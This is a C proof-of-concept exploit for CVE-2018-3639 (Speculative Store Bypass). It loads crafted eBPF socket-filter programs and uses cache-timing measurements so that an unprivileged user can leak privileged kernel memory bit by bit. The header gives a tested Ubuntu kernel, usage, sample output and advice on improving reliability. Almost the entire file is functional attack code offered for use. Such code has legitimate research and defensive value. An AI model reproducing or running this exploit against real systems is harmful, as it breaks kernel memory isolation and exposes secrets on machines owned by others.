// Local exploit for CVE-2018-3639 (as known as Variant4, Speculative store bypass)
// It's to read privileged kernel memory from unprivileged user. (non-root user)
// Tested on 4.4.0-128-generic #154-Ubuntu kernel. (Ubuntu 16.04), CPU - Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz
// Tested environment includes mitigations against Spectre, Meltdown, and SMEP, SMAP are applied.
// 
// First exploit code against CVE-2018-3639 is from Google project zero team.
// (https://www.exploit-db.com/exploits/44695/)
// But, above exploit requires additional assumptions such as kernel modification, ...
// So, testing the exploit is not easy.
//
// I updated the exploit code aginst CVE-2018-3639, and It perfectly works on specific Ubuntu kernel.
// It doesn't require any additional assumption.
// But, Since this exploit is based on a probabilistic way, It's semi-reliable.
//
// Author :  Jinbum Park <jinb.park7@gmail.com>
// 
// Usage :
// $ gcc -o poc_non_root poc_non_root.c
// $ ./poc_non_root ffffffff81a098a4  ==> (ffffffff81a098a4 R rodata_test_data --> real value is 0xC3)
// [] BPF PROG LOADED SUCCESSFULLY
// [] mlock success - user_leak_area
// [] start bruteforce to get leak_area as kernel virtual address.
// [] progress : ffff880307fff000
// ...... (repeat for bruteforce, 3~10 minutes) .......
// [] progress : ffff8803b7fff000
// [] Found kernel vaddr!! ffff8803ba70d000
// [] [bit-0] hit : 16
// [] [bit-1] hit : 2
// [] [bit-2] hit : 0
// [] [bit-3] hit : 0
// [] [bit-4] hit : 0
// [] [bit-5] hit : 0
// [] [bit-6] hit : 18
// [] [bit-7] hit : 40
// [] ffffffff81a098a4: 0xc3 ('â–’')  ==> Final infered value for kernel address "ffffffff81a098a4".
//
// How to make it more reliable? : 
// - Run poc_non_root several times, and Mix the results,
// - e.g) first result - 0x43, second result - 0xC0
//        0x43 | 0xC0 ==> 0xC3 will be more reliable result.
//
// Would you like to omit bruteforce to get address of kernel_leak_area??
// - Run with root!!
//

#define _GNU_SOURCE
#include <pthread.h>
#include <assert.h>
#include <err.h>
#include <stdint.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stddef.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/user.h>

#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_REG_CONFUSED_SLOT BPF_REG_6
#define BPF_REG_SLOW_SLOT BPF_REG_7
#define BPF_REG_SLOW_SLOT2 BPF_REG_5
#define BPF_REG_CONFUSED_SLOT_ALIAS BPF_REG_8
#define BPF_REG_LEAK_ARRAY BPF_REG_9

#define BPF_REG_CONFUSED BPF_REG_1
#define BPF_REG_SECRET_VALUE BPF_REG_2
#define BPF_REG_DUMMY_SLOT BPF_REG_3

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })

char user_leak_area[4096] __attribute__((aligned(4096))) = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0xa0,};
unsigned long kernel_leak_area;

void user_flush_cacheline(void *arg)
{
    asm volatile(
        "mov $0, %%eax\n\t"
        "cpuid\n\t" /* pleeeease don't do this speculatively :/ */
        "clflush %0"
        : "+m" (*(volatile char *)arg)
        : /* no inputs */
        : "ax", "bx", "cx", "dx");
}

int user_timed_reload(void *arg)
{
    int tsc1, tsc2, read_copy;
    asm volatile(
        "mov $0, %%eax\n\t"
        "cpuid\n\t" /* serialize; clobbers eax, ebx, ecx, edx */
        "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
        "mov %%eax, %0\n\t"
        "mov (%3), %%eax\n\t"
        "mov %%eax, %2\n\t"
        "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
        "mov %%eax, %1\n\t"
        : "=&r"(tsc1), "=&r"(tsc2), "=&r"(read_copy)
        : "r"((unsigned int *)arg)
        : "ax", "bx", "cx", "dx");
    return tsc2 - tsc1;
}

int bpf_(int cmd, union bpf_attr *attrs)
{
    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries)
{
    union bpf_attr create_map_attrs = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = value_size,
        .max_entries = num_entries
    };
    int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
    if (mapfd == -1) {
        //err(1, "map create");
		exit(0);
	}
    return mapfd;
}

void array_set_dw(int mapfd, uint32_t key, uint64_t value)
{
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key    = (uint64_t)&key,
        .value  = (uint64_t)&value,
        .flags  = BPF_ANY,
    };

    int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
}

int prog_load(struct bpf_insn *insns, size_t insns_count)
{
    char verifier_log[100000];
    union bpf_attr create_prog_attrs = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = insns_count,
        .insns = (uint64_t)insns,
        .license = (uint64_t)GPLv2,
        .log_level = 1,
        .log_size = sizeof(verifier_log),
        .log_buf = (uint64_t)verifier_log
    };
    int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
    int errno_ = errno;
    //
    errno = errno_;

    return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count)
{
    int progfd = prog_load(insns, insns_count);

    // hook eBPF program up to a socket
    // sendmsg() to the socket will trigger the filter
    // returning 0 in the filter should toss the packet
    int socks[2];
    socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
        // err(1, "socketpair");
    setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int));
    return socks[1];
}

void trigger_proc(int sockfd)
{
    write(sockfd, "X", 1);
}

int input_map, dummy_map;
int sockfds[16];

struct array_timed_reader_prog {
    int control_array;
    int sockfd;
};
struct array_timed_reader_prog time_prog;

#define DUMMY_MAP_SIZE 128
void set_dummy_map(void)
{
    unsigned long i;
    for (i=0; i<DUMMY_MAP_SIZE; i++) {
        array_set_dw(dummy_map, (unsigned int)i, i);
    }
}

static __u64 ptr_to_u64(void *ptr)
{
    return (__u64) (unsigned long) ptr;
}

int bpf_lookup_elem(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
    };

    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int leak_bit(unsigned long addr, unsigned long bit)
{
    int i, time;
    int hit = 0;

    for (i=0; i<256; i++) {
        array_set_dw(input_map, 0, addr);
        array_set_dw(input_map, 1, 0);
        array_set_dw(input_map, 2, kernel_leak_area);
        set_dummy_map();

        user_flush_cacheline(user_leak_area);
        trigger_proc(sockfds[bit]);
        time = user_timed_reload(user_leak_area);
        if (time < 100) hit++;

		sleep(0);
    }

    if (hit > 0)
        return 1;
    return 0;
}

int leak_byte(unsigned long addr)
{
    unsigned char byte = 0;
    for (int bit=0; bit<8; bit++) {
        byte |= (leak_bit(addr, bit))<<bit;
    }
    return byte;
}

#define PHYS_OFFSET (0xFFFF880000000000UL)
#define PFN_MIN (0x00UL)
#define PRESENT_MASK	(1ULL << 63) 	/* get bit 63 from a 64-bit integer */
#define PFN_MASK	((1ULL << 55) - 1)	/* get bits 0-54 from */

unsigned long get_vaddr_from_pfn(unsigned long pfn)
{
	unsigned long va;

	va = PHYS_OFFSET + (4096 * (pfn - PFN_MIN));
	return va;
}
unsigned long calc_kernel_vaddr_from_pagemap(unsigned long vaddr, long psize)
{
	unsigned long kva;
	unsigned long	pentry	= 0;
	FILE		*fp	= NULL;
	
	/* open the pagemap file */
	fp = fopen("/proc/self/pagemap", "r");
	
	/* seek to the appropriate place */
	fseek(fp, (vaddr / psize) * sizeof(unsigned long), SEEK_CUR);

	/* read the corresponding pagemap entry */
	fread(&pentry, sizeof(unsigned long), 1, fp);

	/* check the present bit */
	if ((pentry & PRESENT_MASK) != 0){
		if ((pentry & PFN_MASK) != 0) {
		kva = get_vaddr_from_pfn(pentry & PFN_MASK);
	    }
    }

	(void)fclose(fp);
	return kva;
}

unsigned long calc_kernel_vaddr_from_bruteforce(void)
{
    int time, i, repeat, hit;
    unsigned long area, progress = 0;

    /* candidate address based on heuristic way, It boost up exploitation. */
	/* If you can't find leak_area in these area, Please update this range to cover entire address!! */
    unsigned long cand_start[2] = {0xffff880300000000UL, 0xffff880000000000UL};
    unsigned long cand_end[2] = {0xffff8803fffff000UL, 0xffff8800fffff000UL};


    for (i=0; i<2; i++) {
        for (area=cand_start[i]; area<cand_end[i]; area+=4096) {
            hit = 0;

            for (repeat=0; repeat<5; repeat++) {
                array_set_dw(input_map, 0, area);
                array_set_dw(input_map, 1, 0);
                set_dummy_map();

                user_flush_cacheline(user_leak_area);
                trigger_proc(sockfds[0]);
                time = user_timed_reload(user_leak_area);
                if (time < 200) {
                    hit = 1;
                    break;
                }
            }
            if (hit == 1) {
                
                return area;
            }

            progress++;
            if ((progress % (1<<15)) == 0) {
                break;
            }
        }
    }

    return 0;
}

void pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(cpu_set_t), &set);
}

int main(int argc, char **argv)
{
    setbuf(stdout, NULL);
    pin_cpu(0);

    /* input_map[0] = victim_addr,  input_map[1] = selected_bit, input_map[2] = leak_area */
    input_map = array_create(8, 3);
    dummy_map = array_create(8, DUMMY_MAP_SIZE);


    for(int selected_bit=0; selected_bit<8; selected_bit++) {
        struct bpf_insn insns[] = {
            // Setup-0: write 0x00 to -344 to get a big stack allocation
			// Why 0x00?? It makes normal-execution-path (not speculative) fall through Critical-path-1
            BPF_ST_MEM(BPF_B, BPF_REG_FP, -344, 0x00),

            /* setup: compute stack slot pointers to :
             * - type-confused stack slot (at -72)
             * - pointer to type-confused stack slot (at -144)
             */
            BPF_MOV64_REG(BPF_REG_CONFUSED_SLOT, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_CONFUSED_SLOT, -72),	/* r6 = fp-72 */
            BPF_MOV64_REG(BPF_REG_SLOW_SLOT, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_SLOW_SLOT, -144),	/* r7 = fp-144 */
            BPF_MOV64_REG(BPF_REG_LEAK_ARRAY, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_LEAK_ARRAY, -200),	/* r9 = fp-200;  (fp-200)+128 */
            BPF_MOV64_REG(BPF_REG_SLOW_SLOT2, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_SLOW_SLOT2, -272),	/* r5 = fp-272; */
            BPF_MOV64_REG(BPF_REG_0, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, -344),

            // write to dummy slot
            BPF_ST_MEM(BPF_DW, BPF_REG_0, 0, 0),

            // Setup-1: store victim memory pointer in BPF_REG_CONFUSED_SLOT
            BPF_LD_MAP_FD(BPF_REG_ARG1, input_map),
            BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
            BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
            BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
            BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
            BPF_EXIT_INSN(),
            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),
            BPF_STX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT, BPF_REG_0, 0),	/* *(r6) = victim_addr from input_map */
            /* It means *(fp-72) = victim_addr */

            // Setup-2: store leak area pointer in BPF_REG_CONFUSED_SLOT
            BPF_LD_MAP_FD(BPF_REG_ARG1, input_map),
            BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
            BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 2),
            BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
            BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
            BPF_EXIT_INSN(),
            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),
            BPF_STX_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, BPF_REG_0, 0),	/* *(r9) = leak_area from input_map */
            /* It means *(fp-200) = leak_area */

            // Setup-3: spill pointer to type-confused stack slot
            BPF_STX_MEM(BPF_DW, BPF_REG_SLOW_SLOT, BPF_REG_CONFUSED_SLOT, 0),
            BPF_MOV64_REG(BPF_REG_SLOW_SLOT, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_SLOW_SLOT, -272),	/* r7 = fp-272;  for slow slot2 */
            BPF_STX_MEM(BPF_DW, BPF_REG_SLOW_SLOT, BPF_REG_LEAK_ARRAY, 0),
            BPF_MOV64_REG(BPF_REG_SLOW_SLOT, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_SLOW_SLOT, -144),	/* r7 = fp-144 */
            /* *(r7) = r6;  *(r7) = (fp-72) */

            /* dummy behavior for eviction */
            //DUMMY_INSNS(),

            BPF_MOV64_REG(BPF_REG_DUMMY_SLOT, BPF_REG_FP),	/* r3 = r10 */
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_DUMMY_SLOT, -344), /* r3 -= 344 */

            // Critical-path-0: Get secret bit of victim_addr via SSB.
            BPF_LDX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT_ALIAS, BPF_REG_SLOW_SLOT, 0), /* high-latency read of slot address, r8 = *(r7); */
            BPF_STX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT_ALIAS, BPF_REG_DUMMY_SLOT, 0), /* bypassed store via high-latency address, *(r8) = r3 */
            BPF_LDX_MEM(BPF_DW, BPF_REG_CONFUSED, BPF_REG_CONFUSED_SLOT, 0),	/* r1 = *(r6); r1 = victim_addr */
            BPF_LDX_MEM(BPF_B, BPF_REG_SECRET_VALUE, BPF_REG_CONFUSED, 0),	/* r2 = *(r1); r2 = secret  */
			BPF_ALU64_IMM(BPF_AND, BPF_REG_SECRET_VALUE, 1<<selected_bit),	/* extract 1 bit of secret */
			// Critical-path-0 - End

			// Critical-path-1:  If there is no SSB (speculative-store-bypass), BPF_REG_SECRET_VALUE is always 0. and program exit directly.
			// If there is SSB and BPF_REG_SECRET_VALUE is 0, program exit directly.
			// If there is SSB and BPF_REG_SECRET_VALUE is 1, program continues to access leak_area. and Then, Attacker can examine leak_area to infer secret.
            BPF_JMP_IMM(BPF_JNE, BPF_REG_SECRET_VALUE, 0, 1),
            BPF_EXIT_INSN(),
            // Critical-path-1 - End

            // Critical-path-2:  Access leak_area via SSB.
            BPF_MOV64_REG(BPF_REG_SLOW_SLOT, BPF_REG_FP),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_SLOW_SLOT, -272),	/* r7 = fp-272; */
            BPF_LDX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT_ALIAS, BPF_REG_SLOW_SLOT, 0), /* high-latency read of slot address, r8 = *(r7); */
            BPF_STX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT_ALIAS, BPF_REG_DUMMY_SLOT, 0), /* bypassed store via high-latency address, *(r8) = r3 */
            BPF_LDX_MEM(BPF_DW, BPF_REG_CONFUSED, BPF_REG_LEAK_ARRAY, 0),	/* r1 = *(r9); r1 = leak_area */
            BPF_LDX_MEM(BPF_DW, BPF_REG_SECRET_VALUE, BPF_REG_CONFUSED, 0),	/* r2 = *(r1); Access leak_area!! */
            // Critical-path-2 - End

            BPF_MOV64_IMM(BPF_REG_0, 0),
            BPF_EXIT_INSN()
        };
        sockfds[selected_bit] = create_filtered_socket_fd(insns, ARRSIZE(insns));
    }
    

    if (mlock(user_leak_area, sizeof(user_leak_area)) != 0) {
        
        return 0;
    }
    

	kernel_leak_area = calc_kernel_vaddr_from_pagemap(user_leak_area, 4096);
	if (kernel_leak_area == 0) {
		kernel_leak_area = calc_kernel_vaddr_from_bruteforce();
		if (kernel_leak_area == 0) {
			
			exit(0);
		}
	}

    unsigned long victim_addr = strtoull(argv[1], NULL, 16);
    unsigned long leaked;

    leaked = leak_byte(victim_addr);
    

    return (int)leaked;
}